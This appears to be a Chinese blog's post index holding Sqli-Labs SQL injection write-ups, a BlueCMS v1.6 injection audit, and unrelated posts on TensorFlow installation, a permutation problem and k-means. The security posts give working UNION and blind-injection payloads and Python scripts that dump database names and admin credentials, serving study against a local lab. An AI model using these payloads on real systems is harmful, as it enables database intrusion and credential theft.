      <content type="text"><![CDATA[1000php是指1000个PHP代码审计案例，来自2016.7以前乌云公开漏洞。github地址： https://github.com/Xyntax/1000phpgit clone下来后，案例保存在bugs文件夹里，名称都是wooyun-xxx-xxxxx格式，没有索引，从名字上看也难以知道这是什么类型的漏洞。所以这里为它生成一个目录页面。 Something漏洞的简要信息保存在页面的title标签中，如下使用BeautifulSoup来对wooyun-xxx-xxxxx.html进行解析，获取其title。如下： Code1234567891011121314151617181920import sysimport osfrom bs4 import BeautifulSoupreload(sys)sys.setdefaultencoding('utf8')htmlName = os.listdir(htmlLoc)indexhtml = open("index.html","w")setCharset = '&lt;head&gt;&lt;meta http-equiv="Content-Type" content="text/html; charset=utf-8" /&gt; &lt;/head&gt;'indexhtml.write(setCharset)for i in htmlName: if i[0] == 'w': soup = BeautifulSoup(open(i),"html.parser") url ='&lt;a href="'+i+'"&gt;'+soup.title.string+'&lt;/a&gt;' indexhtml.write(url) indexhtml.write("&lt;/br&gt;")print "done!" Result将代码保存为py文件后，放在bugs文件夹下运行，会生成index.html文件。打开。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Sqli-Labs:Less6-writeup]]></title>
      <url>%2F2017%2F04%2F03%2FSqli-Labs-Less6-writeup%2F</url>
      <content type="text"><![CDATA[第六关是盲注 Step1 1http://localhost:20000/sqllab/Less-6/?id=1&apos; 无报错 1http://localhost:20000/sqllab/Less-6/?id=1&quot; 页面报错，返回信息： use near ‘“1”” LIMIT 0,1’ at line 1。需要闭合双引号。 1http://localhost:20000/sqllab/Less-6/?id=1&quot; AND 1=1 --+ 页面返回正常 1http://localhost:20000/sqllab/Less-6/?id=1&quot; AND 1=2 --+ 返回错误页面（空白） Step2采用盲注。分析同Less5。exp如下：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061import requestsimport stringimport sysquerydata = "schema_name"querydb = "INFORMATION_SCHEMA"global findBitdef sendPayload(payload): url = 'http://localhost:20000/sqllab/Less-6/?id=1" '+ payload content = requests.get(url).text return contentdef findDatabaseNumber(): count = 1 while count: payload = "AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.SCHEMATA) =" payload = payload + str(count) + "--+" recv = sendPayload(payload) if "You are in" in recv: return count else: count += 1def getDatabaseName(dbNum): global findBit for k in range(dbNum): i = 1 while i : findBit = 0 doubleSearch(-1,255,i,k) i += 1 if findBit == 1: sys.stdout.write("\r\n") breakdef doubleSearch(leftNum,rightNum,i,k): global findBit midNum = (leftNum + rightNum) / 2 if (rightNum != leftNum +1): querysql = "AND ASCII(SUBSTRING((SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT " + str(k) + ",1)," + str(i) + ",1)) &gt; " + str(midNum) + "--+" recv = sendPayload(querysql) if "You are in" in recv: doubleSearch(midNum,rightNum,i,k) else: doubleSearch(leftNum,midNum,i,k) else: if rightNum != 0: sys.stdout.write(chr(rightNum)) sys.stdout.flush() else: findBit = 1 returndef exp(): dbNum = findDatabaseNumber() print "the number of database is "+str(dbNum) getDatabaseName(dbNum)exp()]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Sqli-Labs:Less5-writeup]]></title>
      <url>%2F2017%2F04%2F02%2FSqli-Labs-Less5-writeup%2F</url>
      <content type="text"><![CDATA[第五关是盲注 查看是否有注入step1访问1http://localhost:20000/sqllab/Less-5/?id=1 页面正常，返回：You are in…… step21http://localhost:20000/sqllab/Less-5/?id=1&apos; 报错。之后的过程要记得闭合单引号。 step3依次访问如下链接：12http://localhost:20000/sqllab/Less-5/?id=1&apos; AND 1=1 --+http://localhost:20000/sqllab/Less-5/?id=1&apos; AND 1=2 --+ 页面返回信息不同。同时试着使用UNION SELECT注入，1http://localhost:20000/sqllab/Less-5/?id=&apos; UNION SELECT 1,2,3 --+ 页面返回 You are in……返回通用页面。故考虑盲注。 普通盲注攻击这里使用推断攻击技术，通过推断一次一位地逐步提取信息。 总体思路注入 id=1’ AND (condition)后，通过页面返回的信息来判断condition的真假。当condition为真时，会返回包含“You are in……”的正常页面，当condition为假时，返回空页面。 Exp1Condition12Condition Example:SUBSTRING((SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT num1-1,1),num2,1) = char num1和num2都是整数，char为单个字符。 (SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT num1-1,1) 会返回查询到结果（即各数据库名称）的第num1行。 SUBSTRING(*,num2,1) 返回查询后结果的第num2个字母。 SUBSTRING(*,num2,1) = a 是布尔表达式，根据其真假，页面会返回不同的信息。 Something 通过类似的方法，可以先获取数据库的数量，再根据数量依次判断。 通过变化num1，num2，char，可以获取到最后的数据。 多查询一位，通过返回的最后一位是否为空格来判断当前所查询字符串是否已经结束。 Code12345678910111213141516171819202122232425262728293031323334353637383940414243444546import requestsimport stringdataset = " abcdefghijklmnopqrstuvwxyz_"querydata = "schema_name"querydb = "INFORMATION_SCHEMA"def sendPayload(payload): url = "http://localhost:20000/sqllab/Less-5/?id=1' "+ payload content = requests.get(url).text return contentdef findDatabaseNumber(): count = 1 while count: payload = "AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.SCHEMATA) =" payload = payload + str(count) + "--+" recv = sendPayload(payload) if "You are in" in recv: return count else: count += 1def getDatabaseName(dbNum): for k in range(dbNum): i = 1 result = "" while i : for j in dataset: querysql = "AND SUBSTRING((SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT "+str(k)+",1),"+str(i)+",1)='"+j recv = sendPayload(querysql) if "You are in" in recv: if j != ' ': result += j i += 1 else: print result i = 0 breakdef exp(): dbNum = findDatabaseNumber() print "the number of database is "+str(dbNum) getDatabaseName(dbNum)exp() Result Exp2Exp1中，是基于字典进行匹配的，效率低下。可以采用二分法来进行优化。大体思路如上跟Exp1相同。 Condition12Condition Example:ASCII(SUBSTRING((SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0 ,1), 1 ,1)) &gt; 127 判断当前第一行的第一个字符的asll码值是否大于127。若该条件为真，则将127替换为 191 （即 （127+255）/2），若该条件为假，则将127替换为63（即（-1+127）/2） Something在写二分法盲注时遇到了一些问题，想了一些策略，但不知道是不是最好的。如果有更好的做法，希望留言告知 搜索范围选择（-1，255），这样能包括的字符ASCII值x满足：0≤x≤255。当判断到所查询字符串结尾时，此时mysql对应的不是空格ASCII码32，而是0。假设所查询的第一个字符串长度为10，当查询到字符串尾部后（即第11个字符），下面这条语句是恒假的：12ASCII(SUBSTRING((SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0 ,1), 11 ,1)) &gt; 0+ 由于采用了递归二分法。这里用全局变量findBit用来判断当前字符串是否查询结束，若findBit为1，表明已经查完可以直接break跳到下一个查询。 Code123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960import requestsimport stringimport sysquerydata = "schema_name"querydb = "INFORMATION_SCHEMA"global findBitdef sendPayload(payload): url = "http://localhost:20000/sqllab/Less-5/?id=1' "+ payload content = requests.get(url).text return contentdef findDatabaseNumber(): count = 1 while count: payload = "AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.SCHEMATA) =" payload = payload + str(count) + "--+" recv = sendPayload(payload) if "You are in" in recv: return count else: count += 1def getDatabaseName(dbNum): global findBit for k in range(dbNum): i = 1 while i : findBit = 0 doubleSearch(-1,255,i,k) i += 1 if findBit == 1: sys.stdout.write("\r\n") breakdef doubleSearch(leftNum,rightNum,i,k): global findBit midNum = (leftNum + rightNum) / 2 if (rightNum != leftNum +1): querysql = "AND ASCII(SUBSTRING((SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT " + str(k) + ",1)," + str(i) + ",1)) &gt; " + str(midNum) + "--+" recv = sendPayload(querysql) if "You are in" in recv: doubleSearch(midNum,rightNum,i,k) else: doubleSearch(leftNum,midNum,i,k) else: if rightNum != 0: sys.stdout.write(chr(rightNum)) sys.stdout.flush() else: findBit = 1 returndef exp(): dbNum = findDatabaseNumber() print "the number of database is "+str(dbNum) getDatabaseName(dbNum)exp() Result]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Sqli-Labs:Less1-4-writeup]]></title>
      <url>%2F2017%2F04%2F02%2FSqli-Labs-Less1-4-writeup%2F</url>
      <content type="text"><![CDATA[Sqli-Labs是用来练习sql注入的好平台。project地址：https://github.com/Audi-1/sqli-labs本文测试环境：使用phpstudy集成环境。mysql版本：5.5.53 Less 1题目是 GET Error based- Single quotes -String。关注点：基于错误，单引号，字符型注入。 payload11http://localhost:20000/sqllab/Less-1/?id=1&apos; 此时页面会产生报错。 payload21http://localhost:20000/sqllab/Less-1/?id=0&apos; UNION SELECT 1,2,3 --+ 通过UNION SELECT 或者 ORDER BY 语句可以发现字段数为 3 ，可显示位置为 2,3。尾部—+会被浏览器解释为— （空格），这在mysql里是注释。 payload3获取数据库名称1http://localhost:20000/sqllab/Less-1/?id=0&apos; UNION SELECT 1,GROUP_CONCAT(SCHEMA_NAME),3 FROM INFORMATION_SCHEMA.SCHEMATA --+ 利用元数据表INFORMATION_SCHEMA获取数据库信息。 获取表名12http://localhost:20000/sqllab/Less-1/?id=0&apos; UNION SELECT 1,GROUP_CONCAT(TABLE_NAME),3 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=0x7365637572697479 --+ 这里 hex(security)=0x7365637572697479 获取字段名12http://localhost:20000/sqllab/Less-1/?id=0&apos; UNION SELECT 1,GROUP_CONCAT(COLUMN_NAME),3 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 0x7573657273 --+ 获取数据12http://localhost:20000/sqllab/Less-1/?id=0&apos; UNION SELECT 1,GROUP_CONCAT(username,0x3a,password,0x20),3 FROM security.users --+ Less 2题目说是数值型注入。 不需要闭合引号。给出最终payload12http://localhost:20000/sqllab/Less-2/?id=0 UNION SELECT 1,GROUP_CONCAT(username,0x3a,password,0x20),3 FROM security.users --+ Less 3题目提示 SINGLE QUOTES WITH TWIST。 payload11http://localhost:20000/sqllab/Less-3/?id=1&apos; 注意到报错回显中有 )，说明需要闭合。 payload2类似将Less1中的几段payload的前面的 0’ 改为 0’) 即可 最终payload12http://localhost:20000/sqllab/Less-3/?id=0&apos;) UNION SELECT 1,GROUP_CONCAT(username,0x3a,password,0x20),3 FROM security.users --+ Less 4这题需要闭合双引号。 payload11http://localhost:20000/sqllab/Less-4/?id=0&quot; 需要闭合 双引号 payload2类似将Less1中的几段payload的前面的 0’ 改为 0”) 即可 最终payload12http://localhost:20000/sqllab/Less-3/?id=0&apos;) UNION SELECT 1,GROUP_CONCAT(username,0x3a,password,0x20),3 FROM security.users --+ sqlilab环境搭建下载sqlilab传送门：https://github.com/Audi-1/sqli-labs可以选择下载zip后解压或者自行git clone到本地， 推荐phpstudy传送门：http://www.phpstudy.net/a.php/211.html不懂使用的建议查一查。这里假设phpstudyd 主页为 http://localhost:20000/ 安装将sqlilab解压出来的文件夹（默认名为 sqli-labs-master）拷贝到phpstudy的WWW目录下，打开phpstudy，访问sqlilab页面( http://localhost:20000/sqli-labs-master )。点选Setup/reset Database for labs完成数据库配置。之后即可开始实验。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[win下tensorflow安装避坑指南]]></title>
      <url>%2F2017%2F03%2F15%2Fwin%E4%B8%8Btensorflow%E5%AE%89%E8%A3%85%E9%81%BF%E5%9D%91%E6%8C%87%E5%8D%97-0%2F</url>
      <content type="text"><![CDATA[好多同学来问怎么安装tensorflow，想想还是写一下吧。 建议 可以选择使用 virtualenv 来进行python环境的管理,这样不会混乱。 担心包与包之间的依赖问题的话，推荐直接使用 anaconda科学计算发行包。具体安装过程可参见：数据挖掘比赛（0）环境搭建之anaconda安装 原生python安装想想还是把这部分加进来了：） 避坑一：官网下载下载页面：https://www.python.org/downloads/windows/tensorflow官网上面说:tensorflow暂时只支持64bit的python3.5。所以不想折腾的同学不要去下载latest的python3.6，也不要去下python2.7，毕竟py3是未来啊。。 executable installer是把安装文件下载下来后再安装。 避坑二：安装python不想后面麻烦的话，安装时记得把 添加进系统路径 选上其余的选项不用担心，你可以自己选择安装路径，这里我直接选 Install Now了。 避坑三：试试打开cmd，输入python，应该会进入python交互式环境。如果提示不是内部或外部命令啥的，说明你的系统环境变量配置有问题。可以自己再手动添加进去，这里不提。 另外说一下，这里默认的python命令对应的版本为python3.5。 安装tensorflow避坑四：安装命令python3.5自带的pip3包管理器，我可以直接使用它来下载。1pip3 install --upgrade tensorflow 它会自动下载tensorflow及其它一些最新的依赖包。记得加上 —upgrade，不然安装的比如protobuf的版本可能相对较低后续可能会报错。然后会自动进行安装。直至如下： 避坑五：安装系统依赖包初次安装，可能会在导入的时候出错，这是因为win系统的动态链接库MSVCP140.DLL缺失的原因.有些同学在这一步没有出错，我猜你们写C语言用的是VS2015啥的hh。如下图，这里只截取部分。 去微软官网下载 Visual C++ 2015 redistributable，它包含了MSVCP140.DLL。 传送门：Visual C++ 2015 redistributable 一定要注意的是，要选择 x64 版本，对应你的64位操作系统然后安装。 测试在经过前面的步骤后，此时导入tensorflow应该没问题了。!()[http://ojp0pjljj.bkt.clouddn.com/tensor7.jpg]接下来就简单的测试一下，依次输入1234import tensorflow as tfhello = tf.constant('Hello, TensorFlow!')sess = tf.Session()print(sess.run(hello)) 好吧，好像没报错，不过一大堆的消息打印出来，心理总是有点不舒服：） 这边是关于这个问题的两个讨论，两个问题的讨论时间是在今年的2月份。 stackoverflow：unknow op github Issues: unknow op 他们所提出的“解决方法”是安装指定的这个nightly build版本，这个可以确实可以解决掉unknow op的警告问题，不过会产生另外的SSE警告。 关于python3.6有些同学可能一不小心安了python3.6，加上(anaconda官网)[https://www.continuum.io/downloads/]上的版本也已经更新为python3.6了。所以这边提供一个tensorflow-py3.6的安装包。 传送门： Python Extension Packages:tensorflow 至于能不能用，仁者见仁智者见智…… tensorflow GPU计算过程这里不展开，要装 vs+cuda+tensorflow,如果想更快的话，可以添加cudnn库。同时要求显卡是英伟达的且nvidia compute capability要大于3。此处略过不提。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[代码审计之SQL注入：BlueCMSv1.6 sp1]]></title>
      <url>%2F2017%2F03%2F14%2F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%EF%BC%9ABlueCMSv1-6-sp1%2F</url>
      <content type="text"><![CDATA[代码审计学习 工具及环境 bluecms v2.1 sp1链接：http://pan.baidu.com/s/1dFKLanR 密码：8v1c seay审计系统链接：http://pan.baidu.com/s/1dENS4KT 密码：rszt 环境PHP: 5.4.45MYSQL: 5.5.53 注入一审计用seay审计系统审计一下,定位到/ad_js.php。 该条语句为1$ad = $db-&gt;getone("SELECT * FROM ".table('ad')." WHERE ad_id =".$ad_id); getone()是自定义的函数，用来查询数据库，代码如下：12345function getone($sql, $type=MYSQL_ASSOC)&#123; $query = $this-&gt;query($sql,$this-&gt;linkid); $row = mysql_fetch_array($query, $type); return $row;&#125; 回到ad_js.php1"SELECT * FROM ".table('ad')." WHERE ad_id =".$ad_id 可见这里的变量 $ad_id 没有单引号保护。接下来看看这个变量的来源。 1$ad_id = !empty($_GET['ad_id']) ? trim($_GET['ad_id']) : ''; 若通过GET获得ad_id则去除它两边的空白字符，否则为空。在获得了ad_id值后，接下来就直接将$ad_id送入了查询语句，没有做任何过滤，因此这里存在注入。 利用 先查询列数 /ad_js.php?ad_id=1 +UNION +SELECT+1,2,3,4,5,6 报错 ad_js.php?ad_id=1 +UNION +SELECT+1,2,3,4,5,6,7,8 报错 ad_js.php?ad_id=1+UNION+SELECT+1,2,3,4,5,6,7 无报错，且查看源代码发现数字7有回显。 提取数据利用元数据表爆出表名1ad_js.php?ad_id=1+UNION+SELECT+1,2,3,4,5,6,GROUP_CONCAT(table_name) from information_schema.tables where table_schema=database() 爆出字段 ad_js.php?ad_id=1 +UNION +SELECT+1,2,3,4,5,6,GROUP_CONCAT(column_name) from information_schema.columns where table_name=0x626c75655f61646d696e 获取用户名密码 ad_js.php?ad_id=1 +UNION +SELECT+1,2,3,4,5,6,GROUP_CONCAT(admin_name,0x3a,pwd) FROM blue_admin 注入二审计函数定位：12345678910111213141516171819202122232425262728function getip()&#123; if (getenv('HTTP_CLIENT_IP')) &#123; $ip = getenv('HTTP_CLIENT_IP'); &#125; elseif (getenv('HTTP_X_FORWARDED_FOR')) &#123; //????????????????????????????ip ??? $ip = getenv('HTTP_X_FORWARDED_FOR'); &#125; elseif (getenv('HTTP_X_FORWARDED')) &#123; $ip = getenv('HTTP_X_FORWARDED'); &#125; elseif (getenv('HTTP_FORWARDED_FOR')) &#123; $ip = getenv('HTTP_FORWARDED_FOR'); &#125; elseif (getenv('HTTP_FORWARDED')) &#123; $ip = getenv('HTTP_FORWARDED'); &#125; else &#123; $ip = $_SERVER['REMOTE_ADDR']; &#125; return $ip;&#125; 直接获取了ip，并没有验证IP格式，因此我们可以伪造ip。查看一下有哪些位置调用了 getip() ， comment.php页面其中有如下代码 $sql = &quot;INSERT INTO &quot;.table(&#39;comment&#39;).&quot; (com_id, post_id, user_id, type, mood, content, pub_date, ip, is_check) VALUES (&#39;&#39;, &#39;$id&#39;, &#39;$user_id&#39;, &#39;$type&#39;, &#39;$mood&#39;, &#39;$content&#39;, &#39;$timestamp&#39;, &#39;&quot;.getip().&quot;&#39;, &#39;$is_check&#39;)&quot;; $db-&gt;query($sql); 可以看到，这里执行了INSERT语句，且调用了getip()，这里存在注入。 利用这是目前的留言板： 在burp截包后，post参数如下：所以 user_id=2 id=6 即 post_id=6 对应发表留言的文章id type=1 mood=6 （这个无关紧要） 为了能让把管理员账号和密码回显出来，我们不能直接在getip()的位置上直接去查询。在前面的sql语句中，content变量是会回显到页面上的，这里利用这个位置去构造payload。 payload如下： 1&#39;,&#39;1&#39;),(&#39;&#39;,&#39;6&#39;,&#39;2&#39;,&#39;1&#39;,&#39;6&#39;,(select concat(admin_name,&#39;:&#39;,pwd) from blue_admin),&#39;1&#39;,&#39;1 payload分析：1’,’1’)是为了完成第一次插入，之后的（）是为了完成第二次插入，前面的 ‘’,’6’,’2’,’1’,’6’ 是与第一个插入语句的参数相对应。接下来，我们把查询到的账号密码放在了第六个参数即content位置，这样能实现回显。而最后的 ‘1’,’1 是要满足列数相等否则会出错，同时要注意闭合原本语句中的单引号，其中第一个 1 对应sql语句中的$timestamp，表示发表时间，这个无关紧要。 所以这样插入后完整的sql语句是： $sql = INSERT INTO &quot;.table(&#39;comment&#39;).&quot; (com_id, post_id, user_id, type, mood, content, pub_date, ip, is_check) VALUES (&#39;&#39;, &#39;$id&#39;, &#39;$user_id&#39;, &#39;$type&#39;, &#39;$mood&#39;, &#39;$content&#39;, &#39;$timestamp&#39;, &#39;1&#39;,&#39;1&#39;),(&#39;&#39;,&#39;6&#39;,&#39;2&#39;,&#39;1&#39;,&#39;6&#39;,(select concat(admin_name,&#39;:&#39;,pwd) from blue_admin),&#39;1&#39;,&#39;1&#39;, &#39;$is_check&#39;)&quot;; Forward后 注入成功。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[ACMXMU-OJ:1005]]></title>
      <url>%2F2017%2F03%2F09%2FACMXMU-OJ-1005%2F</url>
      <content type="text"><![CDATA[题目 1005.Complete PermutationDescriptionGenerate the complete permutation of 1..N InputEach input file contains only one non-negative integer N (0&lt; N &lt; 9) OutputOutput N! Lines, according to lexicographic order. Sample Input3 Sample Output1 2 3 1 3 2 2 1 3 2 3 1 3 1 2 3 2 1 想法一开始想到用递归来写全排列，就课本上的方法，结果才发现输出时最后两个的次序不对。先试了试STL中的next_permutation函数，后面又自己写了个字典序法全排列。这里简述一下字典序法全排列 待排列“字符串”： P_0P_1P_2..P_{j-1}P_jP_{j+1}..P_n 从后往前搜索，直到找到这样的一个数，它的下标为 j，且满足 P_{j} < P_{j+1}。此时有：P_{j} < P_{j+1} > P_{j+2} > P_{j+3} > .... > P_{n}即从P{j+1} 到 P{n}，它们是按字典序递减的。 再次从后向前搜索，直到找到这样的一个数，它的下标为 k，且满足 P_{k} > P_{j}。P_k的位置如下：P_0P_1P_2..P_{j-1}P_jP_{j+1}....P_{k-1}P_{k}P_{k+1}....P_n 交换P_{k}和P_{j}的值，这时候“字符串”为：P_0P_1P_2..P_{j-1}P_kP_{j+1}....P_{k-1}P_{j}P_{k+1}....P_n这时候得到的“字符串”会比原本的“字符串”大,但并不是所有大于“原字符串”中最小的。 结合由（2）得到的大小关系,以及 P_{k} > P_{j}，可以得到交换后的“字符串”大小关系如下:....P_kP_{j+2}>....>P_{k-1}>P_{j}>P_{k+1}....>P_n所以在最后一步中，把 P{j+1}P{j+2}….P_{n} 反转过来。最后得到：P_0P_1P_2..P_{j-1}P_kP_{n}..P_{j}..P_{j+1}P_{j+2}P_{j+1}....P_n这样得到的新“字符串”是大于“原字符串”中最小的。 提交字典序法全排列先贴代码1234567891011121314151617181920212223242526272829303132333435363738394041#include &lt;iostream&gt;#include &lt;stdio.h&gt;using namespace std;int arrays[10];int main()&#123; int number; int q; scanf("%d",&amp;number); for(q = 1;q &lt;= number;q++) arrays[q] = q; while(true)&#123; int j,k; int q; for(q = 1;q &lt; number;q++) printf("%d ",arrays[q]); printf("%d\n",arrays[number]); for(j = number;j &gt; 0;j--) if(arrays[j] &lt; arrays[j+1]) break; if(j == 0) break; for(k = number;k &gt; j;k--) if(arrays[k] &gt; arrays[j]) break; int temp; temp = arrays[j]; arrays[j] = arrays[k]; arrays[k] = temp; int i1,i2; for(i1 = j+1,i2 = number;i1 &lt; i2;i1++,i2--) &#123; int temp; temp = arrays[i1]; arrays[i1] = arrays[i2]; arrays[i2] = temp; &#125; &#125; return 0;&#125; 使用STL123456789101112131415161718192021#include &lt;iostream&gt;#include &lt;algorithm&gt;#include &lt;stdio.h&gt;using namespace std;int main()&#123; int number; scanf("%d",&amp;number); int a[11]; int i; for(i = 0;i &lt; number;i++) a[i] = i + 1; do&#123; int k; for(k = 0;k &lt; number - 1;k++) printf("%d ",a[k]); printf("%d\n",a[number - 1]); &#125; while (next_permutation(a,a+number)); return 0;&#125; 递归全排列，不合要求123456789101112131415161718192021222324252627282930313233343536#include &lt;iostream&gt;#include &lt;stdio.h&gt;using namespace std;int number;char arrays[11]="0123456789";void Perm(int m);int main()&#123; scanf("%d",&amp;number); int i,j; Perm(1); return 0;&#125;void Perm(int m)&#123; if (m == number)&#123; int i; for(i = 1;i &lt; m;i++) printf("%c ",arrays[i]); printf("%c\n",arrays[m]); &#125; else &#123; int i,j; for(j = m;j &lt;= number;j++)&#123; int temp; temp = arrays[j]; arrays[j] = arrays[m]; arrays[m] = temp; Perm(m+1); temp = arrays[j]; arrays[j] = arrays[m]; arrays[m] = temp; &#125; &#125;&#125;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[机器学习算法：k-means]]></title>
      <url>%2F2017%2F03%2F08%2F%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95%EF%BC%9Ak-means%2F</url>
      <content type="text"><![CDATA[K-means算法学习 条件待分类的特征矢量集为 {x_1,x_2,x_3,……x_N}类别的数目已知：c 基本想法取定 k 个类别，选取 k 个初始聚类中心，按最小距离原则将各模式分配到 k类 中的某一类，之后不断的计算类心和调整各模式的类别，最终使得各模式到其判属类别的距离平方之和最小。 算法步骤 选择k个模式特征矢量作为初始聚类中心：{$ z{_1}{^{(0)}},z{_2}{^{(0)}}, z{_3}{^{(0)}} ,…… ,z{_k}{^{(0)}}$}。令 q = 0。 将待分类的模式特征矢量集{x_i}中的模式逐个按最小距离原则分划给 k类中的某一类，即：如果 d_{il}^{(q)} = {\mathop{min}\limits_{ij}}[d_{ij}^{(q)}]则判定 x_i ∈ ω_l^{q+l}式中，d_{il}^{(q)}表示 x_i 和 ω_j^{q}的中心 z_j^{(j)}。上角标为迭代次数，于是产生了新的聚类 ω_j^{(q+1)} (j=1,2,3,……,k) 计算重新分类后的各类心z_j^{q+1} =\frac{1}{n_j^{q+1}}\sum_{x_i ∈ \omega_j^{q+1}} x_i\tag{j = 1,2,3,……,k} 式中：$n_j^{k+1}$ 为 $\omega_j^(k+1)$ 类中所含模式的个数 如果 $ z_j^{q+1}=z_j^{q} $ ，则结束，否则返回（2） 算法实现12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788import numpy as npimport pandas as pdimport copy as cpdef readData(filepath): file = pd.read_table(filepath,header=None,sep=' ') return file# 计算欧几里得距离def distance(vec1,vec2): return np.sqrt(sum(np.power((vec1-vec2).tolist(),2)))# 计算特征X与各质心的距离，按最小距离原则找到点X对应的类,此处距离为欧式距离def findClass(dataSetloc,centerSet): disitoZ = [] for j in range(len(centerSet)): disitoZ.append(float(distance(dataSetloc,centerSet[j]))) print(disitoZ) return(disitoZ.index(min(disitoZ)))# 用于计算调整后各类的中心def adjustCenter(centerSet,classNumber): tempCenter=[] for i in range(classNumber): tempCenter.append([0,0,0]) for i in range(classNumber): patternNum = len(centerSet[i]) # 计算新的质心 for nowX in centerSet[i]: tempCenter[i][0] += nowX[0] tempCenter[i][1] += nowX[1] tempCenter[i][2] += nowX[2] for j in range(3): tempCenter[i][j] = tempCenter[i][j] / patternNum return tempCenterdef isequal(class1,class2): return (class1[0]==class2[0] and class1[1]==class2[1])pdDataSet = readData('dataset.txt')# 题目所给初始条件sk = int(input("输入类别数目:\n"))center = []classSet = []classLabel = []for i in range(k): print("请输入第",i+1,"个初始中心：") templist = list(input().split(',')) templist = [float(num) for num in templist] center.append(templist) classSet.append([]) classLabel.append([])print('初始中心如下：')print(center)# 用于判断结束条件judgeValue = 1# 用于记录迭代次数global iterationsiterations = 0while judgeValue : # centerCopy保存center的初始值，用于结束判断 print("----------------------------------------") iterations += 1 classLabelCopy = cp.deepcopy(classLabel) print("第",iterations,"次循环") classSet = [[],[],[]] classLabel = [[],[],[]] print("--------计算每个点到各类中心的距离--------") for i in range(len(pdDataSet)): Xindex = findClass(pdDataSet.loc[i],center) classSet[Xindex].append(pdDataSet.loc[i].tolist()) classLabel[Xindex].append(i) print("----------当前各类中心位置----------") center = adjustCenter(classSet,k) for i in range(k): print("第",i+1,"类中心位置为",center[i]) print("----------当前分类结果(数据)----------") print(classSet) print("----------当前分类结果（对应索引）----------") print(classLabel) # 若类别中的点不再变化，则退出循环 if isequal(classLabel,classLabelCopy): judgeValue = 0 dataset.txt内容：1234567891011121314151617181920-7.82 -4.58 -3.97-6.68 3.16 2.714.36 -2.19 2.096.72 0.88 2.80-8.64 3.06 3.50-6.87 0.57 -5.454.47 -2.62 5.766.73 -2.01 4.18-7.71 2.34 -6.33-6.91 -0.49 -5.686.18 2.81 5.826.72 -0.93 -4.04-6.25 -0.26 0.56-6.94 -1.22 1.138.09 0.20 2.256.81 0.17 -4.15-5.19 4.24 4.04-6.38 -1.74 1.434.08 1.30 5.36.27 0.93 -2.78 运算结果 题目一：k = 2, m_{1}(0) = {(1,1,1)}^T,m_{2}(0)={(-1,1,-1)}^T 12345678910111213141516171819202122232425262728293031323334输入类别数目:2请输入第 1 个初始中心：1,1,1请输入第 2 个初始中心：-1,1,-1初始中心如下：[[1.0, 1.0, 1.0], [-1.0, 1.0, -1.0]]----------------------------------------第 1 次循环--------计算每个点到各类中心的距离--------[11.559831313648138, 9.298908538102738][8.159172752185112, 7.119838481314025]（此处省略）----------当前各类中心位置----------第 1 类中心位置为 [6.042999999999999, -0.14599999999999996, 1.7229999999999996]第 2 类中心位置为 [-6.938999999999998, 0.508, -0.8060000000000003]----------当前分类结果(数据)----------[[[4.36, -2.19, 2.09], [6.72, 0.88, 2.8], [4.47, -2.62, 5.76], [6.73, -2.01, 4.18], [6.18, 2.81, 5.82], [6.72, -0.93, -4.04], [8.09, 0.2, 2.25], [6.81, 0.17, -4.15], [4.08, 1.3, 5.3], [6.27, 0.93, -2.78]], [[-7.82, -4.58, -3.97], [-6.68, 3.16, 2.71], [-8.64, 3.06, 3.5], [-6.87, 0.57, -5.45], [-7.71, 2.34, -6.33], [-6.91, -0.49, -5.68], [-6.25, -0.26, 0.56], [-6.94, -1.22, 1.13], [-5.19, 4.24, 4.04], [-6.38, -1.74, 1.43]]]----------当前分类结果（对应索引）----------[[2, 3, 6, 7, 10, 11, 14, 15, 18, 19], [0, 1, 4, 5, 8, 9, 12, 13, 16, 17]]----------------------------------------第 2 次循环--------计算每个点到各类中心的距离--------[15.6286075515383, 6.055972341416364][13.18250863834346, 4.411625664083479]（此处省略）----------当前各类中心位置----------第 1 类中心位置为 [6.042999999999999, -0.14599999999999996, 1.7229999999999996]第 2 类中心位置为 [-6.938999999999998, 0.508, -0.8060000000000003]----------当前分类结果(数据)----------[[[4.36, -2.19, 2.09], [6.72, 0.88, 2.8], [4.47, -2.62, 5.76], [6.73, -2.01, 4.18], [6.18, 2.81, 5.82], [6.72, -0.93, -4.04], [8.09, 0.2, 2.25], [6.81, 0.17, -4.15], [4.08, 1.3, 5.3], [6.27, 0.93, -2.78]], [[-7.82, -4.58, -3.97], [-6.68, 3.16, 2.71], [-8.64, 3.06, 3.5], [-6.87, 0.57, -5.45], [-7.71, 2.34, -6.33], [-6.91, -0.49, -5.68], [-6.25, -0.26, 0.56], [-6.94, -1.22, 1.13], [-5.19, 4.24, 4.04], [-6.38, -1.74, 1.43]]]----------当前分类结果（对应索引）----------[[2, 3, 6, 7, 10, 11, 14, 15, 18, 19], [0, 1, 4, 5, 8, 9, 12, 13, 16, 17]] 题目二：k = 2, m_{1}(0) = {(0,0,0)}^T,m_{2}(0)={(1,1,-1)}^T 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647输入类别数目:2请输入第 1 